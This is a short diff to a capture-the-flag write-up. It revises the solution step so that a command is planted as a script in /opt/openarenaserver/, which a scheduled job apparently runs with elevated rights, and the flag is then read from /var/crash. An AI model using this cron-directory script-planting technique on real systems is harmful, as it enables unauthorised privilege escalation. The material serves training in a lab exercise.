@@ -27,12 +27,12 @@ This script iterate on every files in /opt/openarenaserver/ and execute it with 
 We need to create a little script to get the flag:
 
 ```
-getflag > /opt/openarenaserver/flag
+echo "getflag > /var/crash/flag" > /opt/openarenaserver/script
 ```
 
 Wait 2 minutes and get the flag:
 
 ```
-$ cat flag
+$ cat /var/crash/flag
 Check flag.Here is your token : xxxxxxxxxxxxxxxxxxxxxxxxx
 ```
